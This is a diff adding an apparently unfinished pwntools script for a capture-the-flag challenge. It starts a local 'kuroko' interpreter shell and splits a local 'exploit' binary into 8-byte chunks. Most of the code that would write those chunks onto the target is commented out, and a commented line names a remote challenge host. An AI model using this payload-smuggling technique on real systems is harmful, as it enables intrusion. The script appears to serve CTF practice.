@@ -1,0 +1,71 @@
+#!/usr/bin/python3
+# from socket import timeout
+from pwn import *
+import warnings
+import time
+import sys
+warnings.filterwarnings("ignore")
+# cmds_ = open('script.kr', 'r').readlines()
+# io = remote("5.75.189.36", 31339)
+def createbuff(buffer):
+    # buffer = b"./flag.txt\0"
+    chunk_size = 8
+    chunks = [buffer[i:i + chunk_size] for i in range(0, len(buffer), chunk_size)]
+    return chunks
+file = open("exploit", "rb")
+data = file.read()
+data = createbuff(data)
+# pay = open("payload", "a")
+# pay.write("import fileio\n")
+# pay.write("let file = fileio.open('bin', 'ab')\n")
+# for item in data: 
+#     buff = str(item)
+#     pay.write(f"file.write({buff})\n")
+# file.write(f"echo \"import fileio\" >> script\n")
+# file.write(f"echo \"file = fileio.open(\\\"bin\\\", \\\"ab\\\")\" >> script;\n")
+p = process(["./run.sh"])
+p.sendlineafter("$", "unset PS1_TITLE; unset PS1_RIGHT; unset PS1_LEFT; unset RLINE_THEME; unset WM_THEME;")
+# p.sendlineafter("$","kuroko")
+# p.sendlineafter(">>", "import fileio")
+# p.sendlineafter(">>", "let file = fileio.open('data','aw')")
+# sequence = b'\x1b[22;23H'  # Moves cursor to row 22, column 23
+# sys.stdout.buffer.write(sequence)
+# sys.stdout.flush()
+# p.sendlineafter("$" ,f"echo \"import fileio\" >> sc.krk\n")
+# p.sendlineafter("$" ,f"echo \"let file = fileio.open(\\\"bin\\\", \\\"ab\\\")\" >> sc.krk;\n")
+p.sendlineafter("$", "kuroko")
+count = 0
+# try:
+# pay = open("payload", "r").readlines()
+for item in data:
+    # buff = str(item)[1:].replace("'", "\\'")
+    # p.sendafter("$", f"echo -ne {buff} >> bin;")
+    # if count == 60:
+    #     break
+    buff = str(item)[1:]
+    log.info(f"debug {count} : {buff} ")
+    # log.info(f"debug {count} : {item.decode() = } {len(item) = }")
+    # p.sendafter(">>", item)
+
+    # screen = ""
+    # try:
+    #     screen = p.recv().decode()
+    # except:
+    #     pass
+    # print(screen)
+    # time.sleep(1)
+    count+=1
+    # break
+# except:
+#     pass
+
+# p.sendlineafter(">>", f"file.write({data})")
+# p.sendlineafter("$",f"{data} >")
+# io.recvuntil(b'please give S such that sha256(unhex("')
+# prefix_ = io.recv(16).decode()
+
+# ans = process(["./pow-solver", "28", prefix_]).recvall().decode().strip()
+
+# io.sendlineafter(b'.cpp).\n', ans.encode())
+
+p.interactive()
